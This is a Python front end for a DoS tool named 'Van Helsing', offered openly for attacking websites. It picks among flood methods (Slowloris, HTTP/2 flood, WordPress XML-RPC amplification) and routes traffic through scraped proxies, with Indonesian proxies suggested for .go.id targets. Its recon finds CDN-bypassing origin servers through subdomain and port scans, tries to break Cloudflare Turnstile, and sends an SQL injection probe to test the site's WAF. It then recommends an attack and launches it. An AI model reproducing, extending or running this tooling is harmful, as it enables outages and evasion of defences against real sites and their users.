import os
import sys
import subprocess

# [PRE-FLIGHT CHECK]
try:
    import requests
    import aiohttp
    import playwright
except ImportError:
    print('Missing dependencies. Redirecting to auto-installer...')
    subprocess.check_call([sys.executable, 'install.py'])
    sys.exit(1)

import random
import time
import requests
import asyncio
import aiohttp
import socket
import urllib3

urllib3.disable_warnings()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKRED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class ProxyManager:
    @staticmethod
    def prompt_and_download(target, use_proxy_input=True):
        if not use_proxy_input: return False, []
        
        need_download = True
        if os.path.exists("proxy.txt"):
            print(f"{bcolors.OKCYAN}[?] proxy.txt found. Refresh/Replace it with FRESH proxies? (y/n): {bcolors.RESET}", end="")
            if not input().lower().startswith("y"):
                need_download = False
                
        if need_download:
            print(f"{bcolors.OKCYAN}[?] Select Proxy Source:{bcolors.RESET}")
            print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Mix (High Quantity, Low Quality)")
            print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Indonesian Only (Best for .go.id targets)")
            print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] MIXED MODE (Max Ammo: Public + Indo)")

            rec = "2" if ".id" in target else "1"
            p_opt = input(f"{bcolors.BOLD}Select (1/2/3, Rec: {rec}): {bcolors.RESET}").strip()
            ProxyManager.download_proxies(p_opt)
            
        return ProxyManager.load_proxies()

    @staticmethod
    def download_proxies(mode="1"):
        print(f"{bcolors.WARNING}[*] Downloading proxies natively...{bcolors.RESET}")
        proxies = set()
        
        # 1: Public, 2: Indo, 3: Mixed
        try:
            if mode in ["1", "3"]:
                urls = [
                    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
                    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
                    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
                    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
                ]
                for u in urls:
                    try:
                        r = requests.get(u, timeout=10)
                        for line in r.text.splitlines():
                            if ":" in line: proxies.add(line.strip())
                    except Exception as e:
                        print(f"{bcolors.FAIL}[!] Failed to fetch {u}: {e}{bcolors.RESET}")

            if mode in ["2", "3"]:
                print(f"{bcolors.WARNING}[*] Fetching Fresh Indo Proxies from API...{bcolors.RESET}")
                try:
                    r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all", timeout=10)
                    for line in r.text.splitlines():
                        if ":" in line: proxies.add(line.strip())
                except Exception as e:
                    print(f"{bcolors.FAIL}[!] Failed to fetch Indo proxies: {e}{bcolors.RESET}")

            with open("proxy.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(proxies))
            print(f"{bcolors.OKGREEN}[+] Gathered {len(proxies)} unique proxies!{bcolors.RESET}")
        except Exception as e:
            print(f"{bcolors.FAIL}[!] Critical error during proxy fetch: {e}{bcolors.RESET}")

    @staticmethod
    def load_proxies():
        print(f"{bcolors.OKCYAN}[*] Loading proxies from proxy.txt...{bcolors.RESET}")
        try:
            with open("proxy.txt", "r") as f:
                proxy_list = [line.strip() for line in f if line.strip()]
            if not proxy_list:
                print(f"{bcolors.FAIL}[!] proxy.txt is empty! Falling back to direct connection.{bcolors.RESET}")
                return False, []
            else:
                print(f"{bcolors.OKGREEN}[*] Loaded {len(proxy_list)} proxies.{bcolors.RESET}")
                return True, proxy_list
        except FileNotFoundError:
             print(f"{bcolors.FAIL}[!] proxy.txt not found! Falling back to direct connection.{bcolors.RESET}")
             return False, []

def banner():
    print(f"""{bcolors.OKRED}
    ╦  ╦╔═╗╔╗╔  ╦ ╦╔═╗╦  ╔═╗╦╔╗╔╔═╗
    ╚╗╔╝╠═╣║║║  ╠═╣║╣ ║  ╚═╗║║║║║ ╦
     ╚╝ ╩ ╩╝╚╝  ╩ ╩╚═╝╩═╝╚═╝╩╝╚╝╚═╝ DoS
    {bcolors.WARNING}Interactive Commander v6.0 (Async){bcolors.RESET}
    """)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear()
    banner()

    print(f"{bcolors.HEADER}[ SELECT METHOD ]{bcolors.RESET}")
    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] CHAOS / AUTO - (BEST! Auto-Detects WAF/CMS & Rotates Methods)")
    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] SLOW         - (Best for Windows/Apache/XAMPP)")
    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] DYN          - (Best for Nginx/Cloudflare/Evasion)")
    print(f"[{bcolors.OKCYAN}4{bcolors.RESET}] STRESS       - (High Load/Universal Stress Test)")
    print(f"[{bcolors.OKCYAN}5{bcolors.RESET}] XMLRPC       - (WordPress Amplification Method)")
    print(f"[{bcolors.OKCYAN}6{bcolors.RESET}] POST_DYN     - (Post Flood without Cache)")
    print(f"[{bcolors.OKCYAN}7{bcolors.RESET}] H2_FLOOD     - (HTTP/2 Multiplexing Async Flood)")
    print(f"[{bcolors.OKCYAN}8{bcolors.RESET}] ATTACK INTEL - (Origin Scan + Auto-Rec)")
    print(f"[{bcolors.OKCYAN}9{bcolors.RESET}] SENTINEL     - (Live Target Monitor)")
    print("")
    
    choice = input(f"{bcolors.BOLD}Choose Method (1-9): {bcolors.RESET}")
    
    if choice == "8":
        run_intel()
        sys.exit(0)
    elif choice == "9":
        run_sentinel()
        sys.exit(0)

    methods = {"1": "CHAOS", "2": "SLOW", "3": "DYN", "4": "STRESS", "5": "XMLRPC", "6": "POST_DYN", "7": "H2_FLOOD"}
    method = methods.get(choice, "CHAOS")

    clear()
    banner()
    print(f"{bcolors.HEADER}[ TARGET CONFIGURATION ]{bcolors.RESET}")
    url = input(f"Target URL (e.g. https://example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    origin_ip = input(f"Origin IP (Optional, press Enter to skip): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if origin_ip:
        target = f"{url}@{origin_ip}"
    else:
        target = url

    clear()
    banner()
    print(f"{bcolors.HEADER}[ PROXY CONFIGURATION ]{bcolors.RESET}")
    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Proxy (Auto-Scavenge/Download)")
    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Private Proxy (From your own file)")
    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] Indonesian Scavenger (Auto-find Indo Proxies)")
    
    proxy_choice = input(f"{bcolors.BOLD}Choose Proxy Type (1-3): {bcolors.RESET}")
    
    if proxy_choice == "2":
        proxy_file = input(f"Enter proxy filename (e.g. proxy.txt): {bcolors.OKBLUE}").strip()
        proxy_type = "5"
        print(f"{bcolors.RESET}", end="")
    elif proxy_choice == "3":
        proxy_file = "proxy.txt"
        proxy_type = "7" 
    else:
        proxy_file = "proxy.txt"
        proxy_type = "5"

    clear()
    banner()
    print(f"{bcolors.HEADER}[ INTENSITY CONFIGURATION ]{bcolors.RESET}")
    
    threads = input(f"Threads (Recommended: 100-500, current best: 100): {bcolors.OKBLUE}").strip() or "100"
    print(f"{bcolors.RESET}", end="")
    
    rpc = input(f"RPC (Requests Per Connection, Default: 5): {bcolors.OKBLUE}").strip() or "5"
    print(f"{bcolors.RESET}", end="")
    
    duration = input(f"Duration in Seconds (e.g. 800): {bcolors.OKBLUE}").strip() or "800"
    print(f"{bcolors.RESET}", end="")

    cmd = [
        sys.executable, "start.py",
        method, target, proxy_type, threads, proxy_file, rpc, duration
    ]

    clear()
    banner()
    print(f"{bcolors.OKGREEN}CONFIGURATION COMPLETE!{bcolors.RESET}")
    print(f"Method   : {bcolors.OKBLUE}{method}{bcolors.RESET}")
    print(f"Target   : {bcolors.OKBLUE}{target}{bcolors.RESET}")
    print(f"Threads  : {bcolors.OKBLUE}{threads}{bcolors.RESET}")
    print(f"Duration : {bcolors.OKBLUE}{duration}s{bcolors.RESET}")
    print("-" * 30)
    print(f"{bcolors.BOLD}Launching Attack...{bcolors.RESET}")
    
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"\n{bcolors.FAIL}Error: {e}{bcolors.RESET}")

# ----------------- ASYNC RECON TOOLS -----------------
async def scan_port(sem, target, port):
    async with sem:
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=2.0)
            writer.close()
            await writer.wait_closed()
            return port
        except:
            return None

async def run_port_scan(target_domain, ports):
    sem = asyncio.Semaphore(100)
    tasks = [scan_port(sem, target_domain, p) for p in ports]
    results = await asyncio.gather(*tasks)
    return [p for p in results if p]

_waf_asn_cache = {}

async def check_subdomain_async(sem, sub_domain, target_domain, resolved_ip, main_sig, session):
    async with sem:
        try:
            loop = asyncio.get_event_loop()
            sub_ip = await loop.run_in_executor(None, socket.gethostbyname, sub_domain)
            if sub_ip == resolved_ip: return None # Skip same IP to avoid false positives entirely
            
            is_candidate = False
            match_status = f"{bcolors.WARNING}UNVERIFIED{bcolors.RESET}"
            
            # WAF IP Verification Check via ip-api
            waf_detected = False
            if sub_ip not in _waf_asn_cache:
                try:
                    async with session.get(f"http://ip-api.com/json/{sub_ip}?fields=isp,as", timeout=3) as rip:
                        if rip.status == 200:
                            data = await rip.json()
                            isp_info = (data.get("isp", "") + " " + data.get("as", "")).lower()
                            if any(waf in isp_info for waf in ["cloudflare", "akamai", "fastly", "imperva", "sucuri"]):
                                _waf_asn_cache[sub_ip] = True
                            else:
                                _waf_asn_cache[sub_ip] = False
                except Exception:
                    _waf_asn_cache[sub_ip] = False
            
            waf_detected = _waf_asn_cache.get(sub_ip, False)

            if waf_detected:
                match_status = f"{bcolors.WARNING}CDN/WAF IP (Not Origin){bcolors.RESET}"
            else:
                try:
                    async with session.get(f"http://{sub_domain}", timeout=3, ssl=False) as r_check:
                        content = await r_check.read()
                        check_sig = len(content)
                        if main_sig > 0:
                            ratio = abs(main_sig - check_sig) / main_sig
                            if ratio < 0.2:
                                match_status = f"{bcolors.FAIL}CONFIRMED EXPOSED ORIGIN!{bcolors.RESET}"
                                is_candidate = True
                            else:
                                match_status = f"{bcolors.OKCYAN}Content Mismatch{bcolors.RESET}"
                        else:
                            is_candidate = True # Assumed origin if main sig is 0
                except Exception:
                    match_status = "Dead/Timeout"
            
            return (sub_domain, sub_ip, match_status, is_candidate)
        except Exception:
            return None

async def run_zone_hunter(scan_list, target_domain, resolved_ip, main_sig):
    sem = asyncio.Semaphore(50)
    results = []
    exposed_origin = None
    
    print(f"[*] Scanning {len(scan_list)} subdomains via AsyncIO...")
    connector = aiohttp.TCPConnector(verify_ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(check_subdomain_async(sem, sub, target_domain, resolved_ip, main_sig, session)) for sub in scan_list]
        completed = 0
        total = len(scan_list)
        for f in asyncio.as_completed(tasks):
            completed += 1
            print(f"[*] Scanning Progress: [{completed}/{total}] ...{' '*20}", end="\r")
            try:
                res = await f
                if res:
                    sub_domain, sub_ip, match_status, is_candidate = res
                    print(f"{' '*60}", end="\r") 
                    print(f"[*] Found {sub_domain:<30} : {sub_ip} | {match_status}")
                    if is_candidate and not exposed_origin:
                        exposed_origin = sub_domain
            except Exception as e:
                pass
    return exposed_origin


def run_intel():
    clear()
    banner()
    print(f"{bcolors.HEADER}[ ATTACK INTEL & ORIGIN SCANNER PRO ]{bcolors.RESET}")
    target = input(f"Enter Target Domain (e.g. example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if "://" in target:
        target_domain = target.split("://")[1].split("/")[0]
        target_url = target
    else:
        target_domain = target.split("/")[0]
        target_url = f"https://{target}"

    common_subs = ["origin", "direct", "cpanel", "mail", "dev", "test", "api", "ftp", "beta", "admin", "secure", "www1", "web"]
    print("-" * 40)
    
    use_proxy = False
    print(f"{bcolors.WARNING}[?] Enable Stealth Mode (Use Proxies for Scan)? (y/n): {bcolors.RESET}", end="")
    ans = input().lower()
    if ans.startswith("y"):
        use_proxy, proxy_list = ProxyManager.prompt_and_download(target, True)

    print(f"{bcolors.OKCYAN}Phase 1: DNS & Origin Resolution...{bcolors.RESET}")
    resolved_ip = None
    try:
        resolved_ip = socket.gethostbyname(target_domain)
        print(f"[*] DNS Resolved IP: {bcolors.BOLD}{resolved_ip}{bcolors.RESET}")
    except socket.gaierror as e:
        print(f"{bcolors.FAIL}[!] DNS Resolution Failed: {e}{bcolors.RESET}")
        return

    print(f"\n{bcolors.OKCYAN}Phase 2: Port & Backend Scanner (Async)...{bcolors.RESET}")
    interesting_ports = [80, 443, 8080, 8443, 2052, 2053, 2082, 2083, 2086, 2087, 8880]
    
    open_ports = asyncio.run(run_port_scan(target_domain, interesting_ports))
    if open_ports:
        for p in open_ports:
             print(f"[*] Port {p:<5} : {bcolors.OKGREEN}OPEN{bcolors.RESET}")
    else:
        print(f"[*] Ports      : {bcolors.WARNING}No common opened ports found{bcolors.RESET}")

    print(f"\n{bcolors.OKCYAN}Phase 3: CMS & Vulnerability Hunter...{bcolors.RESET}")
    cms_detected = "Unknown"
    vuln_vector = None
    server_header = "Unknown"
    cdn_guess = "Unknown"
    pass_clearance_to_start = False
    
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'}
    
    def get_req_kwargs():
        kwargs = {'headers': headers, 'timeout': 5, 'verify': False}
        if use_proxy and proxy_list:
            p = random.choice(proxy_list)
            if "://" not in p: p = f"http://{p}"
            kwargs['proxies'] = {'http': p, 'https': p}
        return kwargs

    def get_robust_response(url, retries=3):
        for i in range(retries):
            try:
                kwargs = get_req_kwargs()
                if i > 0: print(f"{bcolors.WARNING}[-] Connection Failed. Retrying ({i+1}/{retries})...{bcolors.RESET}{' '*20}", end="\r")
                r = requests.get(url, **kwargs)
                if i > 0: print(f"{' '*80}", end="\r")
                return r
            except Exception as e:
                if i == retries - 1: raise e
        raise Exception("Max retries")
        
    try:
        r = get_robust_response(target_url)
        server_header = r.headers.get('Server', 'Unknown')
        powered_by = r.headers.get('X-Powered-By', 'Unknown')
        print(f"[*] Server       : {bcolors.OKGREEN}{server_header}{bcolors.RESET}")

        headers_str = str(r.headers).lower()
        wafs = {"cloudflare": "Cloudflare", "akamai": "Akamai", "fastly": "Fastly", "imperva": "Imperva", "sucuri": "Sucuri"}
        for key, name in wafs.items():
            if key in headers_str:
                cdn_guess = name
                break
        if cdn_guess != "Unknown":
            print(f"[*] CDN/WAF      : {bcolors.FAIL}{cdn_guess}{bcolors.RESET}")

        print("[*] Checking for WordPress XML-RPC...", end="\r")
        try:
            r_xml = get_robust_response(f"{target_url}/xmlrpc.php", retries=2)
            if r_xml.status_code == 405 or "XML-RPC server accepts" in r_xml.text:
                print(f"[*] XML-RPC      : {bcolors.FAIL}VULNERABLE (Use Menu 4!){bcolors.RESET}   ")
                cms_detected = "WordPress"
                vuln_vector = "XMLRPC"
            else:
                 print(f"[*] XML-RPC      : Safe/Not Found           ")
        except:
             print(f"[*] XML-RPC      : Error Checking           ")
        
        try:
            cookies_str = str(r.cookies.get_dict()).lower()
            if "phpsessid" in cookies_str:
                print(f"[*] Technology   : {bcolors.WARNING}PHP Detected{bcolors.RESET}")
                if "Apache" in server_header: vuln_vector = "SLOW_POST"
            elif "asp.net" in cookies_str or "asp.net" in powered_by.lower():
                print(f"[*] Technology   : {bcolors.WARNING}ASP.NET{bcolors.RESET}")
        except: pass

        print("[*] Probing WAF Sensitivity...", end="\r")
        try:
            if r.status_code in [403, 503] and ("cloudflare" in headers_str or "turnstile" in r.text.lower() or "challenge" in r.text.lower()):
                 print(f"[*] WAF Status   : {bcolors.FAIL}Cloudflare JS Challenge/Turnstile Detected!{bcolors.RESET}")
                 print(f"[*] Mitigation   : {bcolors.WARNING}Auto-Launching Playwright Turnstile Dispenser...{bcolors.RESET}")
                 try:
                     from turnstile_dispenser import TurnstileDispenser
                     cf_clearance, cf_ua = TurnstileDispenser.solve_challenge(target_url)
                     if cf_clearance:
                         print(f"[*] Dispenser    : {bcolors.OKGREEN}Clearance Secured! Writing to files/cf_clearance.txt{bcolors.RESET}")
                         os.makedirs('files', exist_ok=True)
                         with open("files/cf_clearance.txt", "w") as cf_file:
                             cf_file.write(cf_clearance)
                         pass_clearance_to_start = True
                     else:
                         print(f"[*] Dispenser    : {bcolors.FAIL}Failed to break Turnstile.{bcolors.RESET}")
                 except Exception as err:
                     print(f"[*] Dispenser    : {bcolors.FAIL}Execution failed: {err}{bcolors.RESET}")
            else:
                r_waf = get_robust_response(f"{target_url}?search=' OR 1=1", retries=1)
                if r_waf.status_code in [403, 406, 501]:
                    print(f"[*] WAF Status   : {bcolors.OKGREEN}ACTIVE & SENSITIVE (Blocking SQLi){bcolors.RESET}   ")
                elif r_waf.status_code == 200:
                    print(f"[*] WAF Status   : {bcolors.FAIL}PASSIVE/BYPASSED (Payload Accepted){bcolors.RESET}   ")
                else: 
                     print(f"[*] WAF Status   : Unknown ({r_waf.status_code})           ")
        except Exception as e:
            print(f"[*] WAF Status   : Error Probe: {e}   ")
             
    except Exception as e:
        print(f"{bcolors.FAIL}[!] Phase 3 Error: {e}{bcolors.RESET}")


    print(f"\n{bcolors.OKCYAN}Phase 4: CRT.SH Certificate Search...{bcolors.RESET}")
    try:
        r_crt = get_robust_response(f"https://crt.sh/?q=%.{target_domain}&output=json", retries=2)
        if r_crt.status_code == 200:
            try:
                crt_subs = set()
                for entry in r_crt.json():
                    name = entry.get('name_value', '')
                    for p in name.split("\\n"):
                        if target_domain in p and "*" not in p:
                            crt_subs.add(p)
                if crt_subs:
                    print(f"[*] CRT.SH Found  : {bcolors.OKGREEN}{len(crt_subs)} subdomains{bcolors.RESET}")
                    for sub in crt_subs:
                        clean = sub.replace(f".{target_domain}", "")
                        common_subs.append(clean)
                else:
                    print("[*] CRT.SH        : No new subdomains found.")
            except Exception as e:
                print(f"[*] CRT.SH        : JSON Parse Error {e}")
        else:
            print(f"[*] CRT.SH        : Failed ({r_crt.status_code})")
    except Exception as e:
        print(f"[*] CRT.SH Error  : {e}")

    print(f"\n{bcolors.OKCYAN}Phase 5: Zone Hunter & Content Verification (Async)...{bcolors.RESET}")
    scan_list = [f"{s}.{target_domain}" if target_domain not in s else s for s in list(set(common_subs))]
    
    main_sig = 0
    try:
        main_sig = len(requests.get(target_url, timeout=5, verify=False).content)
        print(f"[*] Main Site Size : {main_sig} bytes")
    except Exception as e:
         print(f"[*] Main Site Size : Failed ({e})")

    exposed_origin = asyncio.run(run_zone_hunter(scan_list, target_domain, resolved_ip, main_sig))

    print(f"\n{bcolors.BOLD}>>> TACTICAL RECOMMENDATION <<<{bcolors.RESET}")
    rec_method, reason = "H2_FLOOD", "Standard High-Throughput HTTP/2 Attack"

    if vuln_vector == "XMLRPC":
        rec_method, reason = "XMLRPC", "CRITICAL: XML-RPC Amplification detected! Most damage per request."
        args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
    elif exposed_origin:
        rec_method, reason = "H2_FLOOD (Origin Bypass)", f"EXPOSED ORIGIN FOUND! Attack {exposed_origin} to bypass {cdn_guess}."
        target_url = f"https://{exposed_origin}"
        args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
    elif "Apache" in server_header and cdn_guess == "Unknown":
        rec_method, reason = "SLOW", "Apache Target without WAF is vulnerable to Slowloris."
        args = [rec_method, target_url, "5", "100", "proxy.txt", "1000", "800"]
    elif 2083 in open_ports or 2087 in open_ports:
        rec_method, reason = "H2_FLOOD (Backend)", "cPanel Ports Open! Attack PORT 2083 to bypass Cloudflare WAF."
        target_url = f"{target_url.replace('https://', '').replace('http://', '').split('/')[0]}:2083"
        args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
    else:
        args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]

    if pass_clearance_to_start:
        reason += " [Clearance Ready]"

    cmd_string = f"{sys.executable} start.py {' '.join(args)}"
    print(f"Method : {bcolors.FAIL}{rec_method}{bcolors.RESET}")
    print(f"Reason : {reason}")
    print(f"Command: {bcolors.OKBLUE}{cmd_string}{bcolors.RESET}")
    
    print(f"\n{bcolors.WARNING}[?] Execute this attack now? (y/n): {bcolors.RESET}", end="")
    if input().lower().startswith("y"):
        cmd = [sys.executable, "start.py"] + args
        try:
            subprocess.run(cmd)
        except Exception as e:
            print(f"Error: {e}")

    print(f"\n{bcolors.OKCYAN}[?] Save Intel Report to 'intel_report.txt'? (y/n): {bcolors.RESET}", end="")
    if input().lower().startswith("y"):
        try:
            with open("intel_report.txt", "a") as f:
                f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] Target: {target_url}\n")
                f.write(f"   IP: {resolved_ip}\n   Server: {server_header}\n")
                if cdn_guess != "Unknown": f.write(f"   WAF: {cdn_guess}\n")
                if open_ports: f.write(f"   Open Ports: {open_ports}\n")
                if exposed_origin: f.write(f"   Exposed Origin: {exposed_origin}\n")
                if vuln_vector: f.write(f"   Vulnerability: {vuln_vector}\n")
                f.write(f"   Recommended: {rec_method}\n")
                f.write("-" * 40 + "\n")
            print(f"{bcolors.OKGREEN}[+] Report Saved!{bcolors.RESET}")
        except Exception as e:
            print(f"{bcolors.FAIL}[!] Failed to save report: {e}{bcolors.RESET}")

    print("\nPress Enter to return to menu...")
    input()
    main()

def run_sentinel():
    clear()
    banner()
    print(f"{bcolors.HEADER}[ SENTINEL - LIVE TARGET MONITOR ]{bcolors.RESET}")
    target = input(f"Enter Target URL (e.g. https://example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if not target.startswith("http"): target = "https://" + target
        
    print(f"\n{bcolors.WARNING}[?] Use Proxies for Monitoring? (y/n): {bcolors.RESET}", end="")
    use_proxy = False
    proxy_list = []
    if input().lower().startswith("y"):
        use_proxy, proxy_list = ProxyManager.prompt_and_download(target, True)

    print(f"\n{bcolors.BOLD}[*] Monitoring {target}... (Ctrl+C to stop){bcolors.RESET}")
    print("-" * 50)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        while True:
            timestamp = time.strftime('%H:%M:%S')
            try:
                req_kwargs = {'headers': headers, 'timeout': 5, 'verify': False}
                if use_proxy and proxy_list:
                     p = random.choice(proxy_list)
                     if "://" not in p: p = f"http://{p}"
                     req_kwargs['proxies'] = {'http': p, 'https': p}

                start_time = time.time()
                r = requests.get(target, **req_kwargs)
                latency = int((time.time() - start_time) * 1000)
                
                status_color = bcolors.OKGREEN if r.status_code < 400 else bcolors.WARNING if r.status_code < 500 else bcolors.FAIL
                print(f"[{timestamp}] Status: {status_color}{r.status_code}{bcolors.RESET} | Time: {latency}ms")
                
            except (requests.exceptions.ProxyError, requests.exceptions.Timeout):
                 msg = "TIMEOUT/PROXY LAG" if use_proxy else "TIMEOUT"
                 print(f"[{timestamp}] Status: {bcolors.WARNING}{msg}{bcolors.RESET} | Retrying...")
            except requests.exceptions.ConnectionError:
                 msg = "CONN FAIL" if use_proxy else "DOWN"
                 print(f"[{timestamp}] Status: {bcolors.FAIL}{msg}{bcolors.RESET}    | Unreachable")
            except Exception as e:
                print(f"[{timestamp}] Status: {bcolors.FAIL}ERROR{bcolors.RESET}   | {e}")
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print(f"\n{bcolors.WARNING}Sentinel Stopped.{bcolors.RESET}")
        time.sleep(1)
        main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{bcolors.WARNING}Exiting Van Helsing...{bcolors.RESET}")
        sys.exit(0)
